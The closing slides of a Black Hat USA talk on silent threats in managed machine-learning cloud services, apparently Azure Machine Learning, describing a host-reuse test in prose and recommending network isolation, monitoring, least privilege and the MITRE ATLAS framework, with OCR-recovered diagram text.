## Slide 86

#### Verifying host re-use

- Create a malicious job which creates a file on the underlying host

- Delete the job from the workspace

- Create a new job in the same workspace

- Expectation: File is removed (New job → New VM)

- Observation: File exists (at times) (New job → Old VM)

#BHUSA @BlackHatEvents

## Slide 87

#### Learning

job
Pool A
job
Pool B

#BHUSA @BlackHatEvents

## Slide 88

###### Where do we go now?

#BHUSA @BlackHatEvents

## Slide 89

Source: MS Docs

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Secure Azure Machine Learning
workspace resources using
virtual networks (VNets)
Article * 04/04/2023 + 19 contributors
In this article
Prerequisites
Example scenario
Public workspace and secured resources
Secure the workspace and associated resources
Show 8 more
Azure Machine
Learning Workspace
Allow access from
trusted Azure services
Azure Storage
Private Service
Endpoint endpoint
User client or
Private
Endpoint
Customer virtual network
Source: MS Docs
account =m
Azure Key
Vault
Azure Container
Registry
```

## Slide 90

#BHUSA @BlackHatEvents

Use Private Links, Bastion, Endpoints


> Recovered by OCR — confidence 94/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Azure Batch Service
Service tag batch/
Azure Machine
Learning for
inbound
(Private)
(Public)
Microsoft managed
Compute
Compute
Training subnet
Customer virtual network
Azure Machine
Learning Workspace
¥
Azure Bastion
Jumpbox
Private
Endpoint
AzureBastion
subnet
Scoring subnet
Azure Storage
Allow access from
trusted Azure
services
pt Container
Registr
Azure Key ay
Vault
Endpoint Endpoint
Private
Endpoint
Use Private Links, Bastion, Endpoints
```

## Slide 91

#### Network Isolation Options

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Basics Networking — Encryption Identity Tags Review + create
Network isolation
Choose the type of network isolation you need for your workspace, from not isolated at all to an entirely separate virtual
network managed by Azure Machine Learning. Learn more about managed network isolation &
Public Private with Internet Private with Approved
Workspace is accessed via Outbound Outbound
public endpoint Workspace is accessed via Workspace is accessed via
Compute can access public private endpoint private endpoint
ecto SSS Compute can access private Compute can access
Outbound data movement Is resources allowlisted resources only
unrestricted Outbound data movement is Outbound data movement is
unrestricted restricted to approved targets
Learn more about public
networks Learn more about private Learn more about data
networks &@ exfiltration protection 7
```

## Slide 92

- Monitor Cloud environments for changes

- Setup logging using Cloud Native solutions

- Leverage frameworks (e.g., Azure Threat Research Matrix)

- ‘Trust, but verify’ (e.g., Integrity of  Jupyter notebooks, scripts etc)

- Examine managed services to uncover silent threats

- Implement the principle of least privilege (e.g., use custom roles)

#BHUSA @BlackHatEvents

## Slide 93

###### MITRE ATLAS™Framework for MLaaS Environments

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Reconnaissance
5 techniques
&
MITRE ATLAS™ Framework for MLaaS Environments
Resource
Development ®
7 techniques
Initial
Access ®
4 techniques
ML Model
Access
4 techniques
Execution ® Persistence ® Defense Discovery ®
2 techniques
2 techniques
Evasion
Collection ® ML Attack
3 techniques
Staging
4 techniques
Exfiltration ® Impact ®
2techniques 7 techniques
Search for Victim's
Publicly Available
Research
Materials
Search for Publicly
Available
Adversarial
Vulnerability
Analysis
Search Victim-
Owned
Websites
Search Application
Repositories
Active
Scanning &
Acquire Public ML Supply
ML Chain
Artifacts Compromise
Obtain Valid
Capabilities & Accounts ®
Develop Evade ML
Adversarial ML Model
Attack
Capabilities Exploit
Public-Facing
Infrastructure Application
Publish
Poisoned
Datasets
Poison Training
Data
Establish
Accounts &
ML Model
Inference API
Access
ML-Enabled
Product or
Service
Physical
Environment
Access
Full ML
Model
Access
User
Execution ®
Command
and Scripting
Interpreter &
Poison
Training
Data
Backdoor ML
Model
Evade ML
Model
Discover ML
Model
Ontology
Discover ML
Model
Family
Discover ML
Artifacts
ML Artifact
Collection
Data from
Information
Repositories &
Data from
Local
System &
Create
Proxy ML
Model
Backdoor
ML
Model
Verify
Attack
Craft
Adversarial
Data
Evade ML
Model
Exfiltration
via ML
Inference
API Denial of
ML
Service
Exfiltration
via Cyber
Means Spamming
ML System
with Chaff
Data
Erode ML
Model
Integrity
Cost
Harvesting
ML
Intellectual
Property
Theft
System
Misuse for
External
Effect
```

## Slide 94

#### ATLAS Case Studies

<u>Case Studies</u> of attacks on ML systems

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Compromised PyTorch Dependency
Incident Date: 25 December 2022 | Reporter: PyTorch
*% DOWNLOAD DATA +
Actor: Unknown | Target: PyTorch
Microsoft Azure Service Disruption
Incident Date: 2020
Actor: Microsoft Al Red Team | Target: Internal Microsoft Azure Service
Case Studies of attacks on ML systems
```

## Slide 95

#### Acknowledgements

David Fiser (@anu4is)

###### @thezdi

Magno Oliveira (@magnologan)

#BHUSA @BlackHatEvents

## Slide 96

#### Black Hat Sound Bytes

Combat silent threats by practicing Defense-in-Depth Risk increases when features and bugs combine Secret agents → Secret bugs → Increased attack surface

#BHUSA @BlackHatEvents

## Slide 97

## we need to secure our present, first.

#BHUSA @BlackHatEvents

## Slide 98

# Thank you!

#BHUSA @BlackHatEvents
